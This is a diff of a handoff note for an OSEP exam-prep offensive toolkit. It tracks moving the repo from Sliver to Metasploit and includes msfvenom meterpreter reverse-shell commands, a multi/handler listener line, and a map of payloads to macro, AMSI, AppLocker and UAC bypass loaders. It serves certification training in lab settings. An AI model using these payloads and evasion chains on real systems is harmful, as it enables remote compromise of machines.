@@ -1,144 +1,66 @@
-# Handoff — osep-tools: Sliver → Metasploit
+# Handoff — osep-tools
 
-> **Decision:** Stick with Metasploit for OSEP. De-Sliver the repo. The Rust repo is **out of scope** (not exam-relevant).
+**Last updated:** 2026-10-07 (after `21a5214 Fuck sliver, move to metasploit`)
 
-## Context: original repo vs local fork (why this is mostly a "revert")
-
-Comparing `darkness215/osep-tools` (original) with the local fork:
-
-| Thing | Original repo | Local fork |
-|---|---|---|
-| `README.md` Requirements table | `msfvenom` / Sliver (msfvenom **first**) | **Sliver** (primary), msfvenom removed |
-| `RUNBOOK.md` | ❌ doesn't exist | ✅ Sliver-centric runbook |
-| `nimsyscallpacker/` | ❌ | ✅ Sliver-specific (packs "Sliver shellcode") |
-| `applocker/`, `cs-loaders/`, `lateral-movement/` | ❌ | ✅ (these are **C2-agnostic**, keep them) |
-| `hta-delivery/` | single HTA (bitsadmin/InstallUtil) | `red.hta` (PS cradle) + `black.hta` (InstallUtil) |
-
-**Key insight:** the original repo was already `msfvenom`-first and C2-agnostic. The fork *added* the Sliver bias (RUNBOOK, nimsyscallpacker, README rewrite). The technique code (VBA/C#/PS) never depended on Sliver — it just takes raw shellcode or byte arrays. The migration is therefore mostly **documentation/comment rewrites**, not code changes.
+> **Standing decisions**
+> - **C2:** Metasploit (`msfvenom` + `multi/handler`). Sliver stays documented as an optional secondary only.
+> - **Rust-for-Malware-Development:** out of scope, not exam-relevant.
+> - **Technique code is C2-agnostic.** Every VBA/C#/PS loader takes raw shellcode or a byte array, so swapping C2 is a docs change, never a code change. Keep it that way.
 
 ---
 
-## Task 1 — Make `README.md` + `RUNBOOK.md` msfvenom-first
+## Status: the Sliver → Metasploit migration is DONE
 
-### 1a. `README.md`
-- [ ] Revert the **Requirements** table to match the original:
-  - `msfvenom` / `msfconsole` → generate shellcode, payloads, and stagers
-  - `Python 3` → encryption scripts, HTTP server
-  - `.NET SDK` → compile C# runners
-  - `Visual Studio / VS Code` → build C# projects (Release, x64)
-  - Keep `Sliver` only as an *optional secondary C2* (one line, clearly optional).
-- [ ] Rewrite the `nimsyscallpacker/` blurb: note it packs **raw shellcode / PE / C#** (so it accepts `msfvenom -f raw` output too), and mark it *optional / EDR-escalation only*.
-- [ ] Update the `hta-delivery/` blurb to describe both files (`red.hta` = in-memory PS cradle, `black.hta` = bitsadmin + InstallUtil) — already largely done, just remove any Sliver-only wording.
-- [ ] Remove the intro line's claim that the toolkit "replaces msfvenom/meterpreter."
+All three tasks from the previous handoff closed. Verified against the tree, not just assumed:
 
-### 1b. `RUNBOOK.md`
-- [ ] **Section 0 (C2 setup)** → replace `sliver` listener commands with a `multi/handler`:
-  ```bash
-  # Staged (recommended default for OSEP)
-  msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
-  # Stageless
-  msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
-  ```
-- [ ] **Section 2 (Generate shellcode)** → replace every `sliver > generate ...` with the `msfvenom` equivalents from Task 2.
-- [ ] Replace the transport table (`mtls/https/http/wg/dns`) with Metasploit equivalents (`reverse_tcp` / `reverse_https` / `reverse_http`), noting `reverse_https` blends into TLS/443.
-- [ ] Update the "one-line mental model" to say "`msfvenom` → generate" instead of "`sliver > generate`."
+| Was | Now |
+|---|---|
+| README Requirements table was Sliver-primary | `msfvenom`/`msfconsole` first; Sliver is one clearly-optional line (`README.md:90`) |
+| RUNBOOK was Sliver-centric | Section 0 is a `multi/handler`; Section 2 is `msfvenom`; transports are `reverse_tcp`/`reverse_https`/`reverse_http` |
+| No payload cheat sheet | `MSFVENOM.md` exists — 7 sections incl. a loader → command mapping table |
+| `sliver > generate` in loader headers | Every loader header now shows the `msfvenom` equivalent |
+| `nimsyscallpacker` said "packs Sliver shellcode" | Now generic (shellcode/PE/C#) with `msfvenom -f raw` examples at lines 48/51 |
 
-### 1c. Sweep remaining Sliver references (mechanical, all files)
-- [ ] `aes-loaders/aes-shellcode-encryption/aes-shellcode-encryption.cs` — header comment line 4: `sliver > generate ... --format csharp` → `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp`.
-- [ ] `aes-loaders/aes-normal-runner/…` + other `aes-loaders/*` headers — same swap.
-- [ ] `word-macro/xor-shellcode-runner/xor-shellcode-encryption-3-byte.cs` — line 17 comment swap.
-- [ ] `ps-loaders/ps-shellcode-runner.ps1` — header lines 5/9 already mix Sliver + msfvenom; make msfvenom primary.
-- [ ] `cs-loaders/README.md` — swap the `sliver > generate` lines for `msfvenom` (see Task 2).
-- [ ] `nimsyscallpacker/README.md` — replace "packs Sliver shellcode" with "packs msfvenom raw shellcode (`-f raw`)"; keep the Nim build steps.
+`grep -rin sliver` across the repo returns only this file and the one optional-C2 line. Working tree is clean.
+
+**Task 3 format checks (by inspection) all passed:** C# loaders want `-f csharp`, the AES/XOR encryptors take that same array and emit their own, `ps-shellcode-runner.ps1` takes `-f raw` hosted or `-f ps1` inline, the PS/HTA/lateral stagers want `-f psh`, InstallUtil wants a compiled .NET assembly plus `-f psh` text files.
 
 ---
 
-## Task 2 — Add `MSFVENOM.md` (payload-generation cheat sheet)
+## Open work
 
-New file at repo root. Content skeleton:
+### 1. Lab validation — NOT RUN (highest value, do before the exam)
+The format matches above were confirmed by reading code. Nothing has proved a session actually comes back. These three round-trips are the only real test:
 
-```markdown
-# msfvenom Cheat Sheet — osep-tools
+- [ ] **Staged, hosted raw** → `msfvenom -p windows/x64/meterpreter/reverse_tcp ... EXITFUNC=thread -f raw` → host → `ps-shellcode-runner.ps1` and one `cs-loaders` runner → session.
+- [ ] **Stageless, encrypted** → `meterpreter_reverse_tcp -f csharp` → `aes-shellcode-encryption.cs` → `aes-normal-runner` → session.
+- [ ] **PowerShell payload** → `-f psh` served as `payload.ps1` → `ps-loader.ps1` → session.
 
-## Raw shellcode (base blob)
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc.bin     # stageless (~200KB)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager.bin  # staged (~500B)
-msfvenom -p windows/meterpreter_reverse_tcp    LHOST=<IP> LPORT=8888 -f raw -o /tmp/sc32.bin    # x86 stageless
-msfvenom -p windows/meterpreter/reverse_tcp    LHOST=<IP> LPORT=8888 EXITFUNC=thread -f raw -o /tmp/stager32.bin
+### 2. NimSyscallPacker — packing never verified
+`nimsyscallpacker/README.md` documents the build and the `msfvenom -f raw` input, but no successful pack-and-callback has been recorded. Optional / EDR-escalation only, so this is below the three round-trips.
 
-## Re-format existing raw → array (no re-encode)
-msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs
-msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1    -o /tmp/sc.ps1
-msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f vba    -o /tmp/sc.vba
+- [ ] Build the packer once, pack a stageless raw blob, confirm a session.
+- [ ] Note the exact working flags in the README (it currently says "check exact flags with `--help`").
 
-## Direct array output (no intermediate file)
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f csharp
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f ps1
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f vbapplication
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=8888 -f vba
+### 3. Cosmetic — two loaders have no generation header
+Every other loader carries a header comment naming the `msfvenom` command that feeds it. These two never had one:
 
-## PowerShell script (for ps-loader.ps1 / red.hta / lateral-movement stagers)
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 -f psh -o /tmp/payload.ps1
-
-## Listener
-msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 8888; set ExitOnSession false; exploit -j"
-```
-
-| Loader | Input it expects | Generate with |
-|---|---|---|
-| `word-macro/caesar-cipher/` | VBA `Array()` (Caesar-encrypted) | raw → `vba-caesar-cipher-encryption.cs` → paste |
-| `word-macro/xor-shellcode-runner/` | VBA `Warhead = Array()` (XOR-enc) | raw → `xor-shellcode-encryption-3-byte.cs` → paste |
-| `word-macro/alternative-shellcode-runner/` | VBA array (XOR-enc) | same as XOR runner |
-| `word-macro/installutil-applocker-bypass/` | .NET InstallUtil exe (downloads `run.txt`) | compile `installutil.cs`; `run.txt` = `-f psh` stager |
-| `word-macro/recon/` | n/a (phone-home GET) | n/a |
-| `aes-loaders/*` | C# `byte[] buf` (AES-encrypted) | raw → `aes-shellcode-encryption.cs` → paste encrypted buf |
-| `amsi-bypass/` | inline PowerShell | n/a |
-| `hta-delivery/red.hta` | PS cradle → `payload.ps1` | `-f psh` |
-| `hta-delivery/black.hta` | bitsadmin + InstallUtil .NET | compile `installutil.cs` |
-| `ps-loaders/ps-loader.ps1` | PS script (`payload.ps1`) | `-f psh` |
-| `ps-loaders/ps-shellcode-runner.ps1` | raw `.bin` (DownloadData) **or** inline `ps1` array | `-f raw` or `-f ps1` |
-| `uac-bypass/` | inline PS (set elevated payload) | `-f psh` |
-| `applocker/msbuild-shellcode.xml` | inline C# task | `-f csharp` array |
-| `applocker/regsvr32.sct` | scriptlet (PS) | `-f psh` / regsvr32 |
-| `cs-loaders/` (nt/apc/dinvoke/unhook) | raw → C# `byte[] buf` | `-f csharp` or `generic/custom` |
-| `lateral-movement/*` | PS stager (`run.ps1`) | `-f psh` |
-| `nimsyscallpacker/` | raw shellcode / PE / C# | `-f raw` (stageless) |
-
-> ⚠️ **VBA size limit:** stageless meterpreter (`meterpreter_reverse_tcp`) is ~200KB — too big for a single VBA module. For macros use the **staged** `windows/x64/meterpreter/reverse_tcp` stager (~500B) or a download cradle. C#/PS loaders that `DownloadData`/`DownloadString` at runtime can use either.
-
+- [ ] `aes-loaders/aes-process-hollowing/aes-process-hollowing-runner.cs`
+- [ ] `word-macro/caesar-cipher/vba-caesar-cipher-encryption.cs`
 
 ---
 
-## Task 3 — Verify each loader's input format against `msfvenom` output
-
-Confirm (no code change unless mismatched) that each loader's expected format equals what `msfvenom` emits:
-
-- [ ] **C# loaders** (`aes-loaders/*`, `cs-loaders/*`): expect `byte[] buf = new byte[N] { 0x.., .. };` → matches `msfvenom -f csharp` (12 bytes/line, `0x` prefix). ✅
-- [ ] **AES encryptor** (`aes-shellcode-encryption.cs`): takes a plain `byte[] shellcode` and emits the same C# `byte[] buf` format → feed it `msfvenom -f csharp` output. ✅
-- [ ] **XOR encryptor** (`xor-shellcode-encryption-3-byte.cs`): takes `byte[] buf`, emits VBA `Warhead = Array(…)` → feed `msfvenom -f csharp` output; runner consumes `Warhead`. ✅
-- [ ] **`ps-shellcode-runner.ps1`**: `[Byte[]] $buf = (DownloadData '…/sc.bin')` **or** inline `0xfc,0x48,…` → matches `-f raw` (hosted) or `-f ps1` (inline). ✅
-- [ ] **`ps-loader.ps1` / `red.hta` / `lateral-movement` stagers**: expect a PS script to download/execute → matches `-f psh`. ✅
-- [ ] **InstallUtil chain** (`installutil.cs`): downloads `amsi.txt` + `run.txt` → `run.txt`/`amsi.txt` = `msfvenom -f psh` output (or a PS AMSI-bypass + stager). ✅
-- [ ] **`nimsyscallpacker`**: accepts raw shellcode → confirm it packs `msfvenom -f raw` (stageless) as well as it did Sliver raw. If it only hard-codes Sliver formats, mark it optional/out-of-scope.
-
-**Verification run (do this in the lab before exam):**
-1. Generate staged payload → host raw → confirm `ps-shellcode-runner.ps1` and `cs-loaders` get a session.
-2. Generate stageless `meterpreter_reverse_tcp` → AES-encrypt → run `aes-normal-runner` → session.
-3. Generate `-f psh` → serve as `payload.ps1` → run `ps-loader.ps1` → session.
+## Known non-issues (do not "fix" these)
+- **`word-macro/installutil-applocker-bypass/__pycache__/`** is on disk but **untracked**, and `.gitignore` already covers `__pycache__/` and `*.pyc`. Nothing to do.
+- **`.gitignore` ignores `*.exe` while `reference/` holds committed binaries.** Only the `.sys` drivers under `reference/09 - PPL Bypass/` are tracked; the ignore rule is working as intended.
+- **VBA size limit.** Stageless meterpreter is ~200KB and will not fit a single VBA module. Macros use the staged ~500B stager or a download cradle. This is documented in `MSFVENOM.md` and is a constraint, not a bug.
 
 ---
 
-## Out of scope
-- ❌ Rust-for-Malware-Development (not exam-relevant; excluded per decision).
-- ⚙️ (Optional) Deep `nimsyscallpacker` rebuild — only if Defender/EDR becomes the blocker in the challenge labs.
-
----
-
-## Acceptance checklist
-- [ ] No `sliver` commands remain in README.md or RUNBOOK.md (grep `sliver` → only "optional secondary C2" mentions).
-- [ ] `MSFVENOM.md` exists and maps every loader to a working command.
-- [ ] Every loader's input format is confirmed against `msfvenom` output (Task 3 table).
-- [ ] A staged + stageless + PS-payload round-trip was validated in the lab.
-
-
-
+## Where things live
+| File | Use it for |
+|---|---|
+| `README.md` | What each folder does, requirements |
+| `RUNBOOK.md` | **Exam-time path.** 11 stages, organised by situation ("Office present → macro") |
+| `MSFVENOM.md` | Payload generation + which command feeds which loader |
+| `handoff.md` | This file — state between sessions |
